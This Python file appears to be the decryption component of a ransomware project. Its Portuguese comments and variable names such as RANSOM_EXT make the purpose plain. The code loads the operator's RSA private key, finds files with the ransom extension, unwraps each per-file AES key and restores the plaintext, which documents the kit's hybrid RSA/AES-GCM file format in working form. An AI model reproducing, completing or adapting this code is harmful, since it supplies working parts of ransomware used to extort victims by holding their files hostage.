# language: Python 3.10+, file: decrypter.py
# Usa a private_key.pem para desfazer tudo. Sem ela, nada volta.
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from config import TARGET_DIR, RANSOM_EXT, MAX_WORKERS, BASE

NONCE_SIZE = 12
WRAPPED_KEY_SIZE = 256

with open(os.path.join(BASE, "private_key.pem"), "rb") as f:
    PRIVATE_KEY = serialization.load_pem_private_key(f.read(), password=None)


def decrypt_file(path: str) -> None:
    with open(path, "rb") as f:
        blob = f.read()

    nonce = blob[:NONCE_SIZE]
    wrapped_key = blob[NONCE_SIZE:NONCE_SIZE + WRAPPED_KEY_SIZE]
    ciphertext = blob[NONCE_SIZE + WRAPPED_KEY_SIZE:]

    aes_key = PRIVATE_KEY.decrypt(
        wrapped_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    plaintext = AESGCM(aes_key).decrypt(nonce, ciphertext, None)

    original = path[:-len(RANSOM_EXT)]
    with open(original, "wb") as f:
        f.write(plaintext)
    os.remove(path)


def run() -> None:
    targets = []
    for dirpath, _, filenames in os.walk(TARGET_DIR):
        for name in filenames:
            if name.endswith(RANSOM_EXT):
                targets.append(os.path.join(dirpath, name))

    print(f"[*] {len(targets)} arquivo(s) cifrado(s)")
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(decrypt_file, p): p for p in targets}
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception as e:
                print(f"[!] {futures[fut]}: {e}")
    print("[*] restaurado")


if __name__ == "__main__":
    run()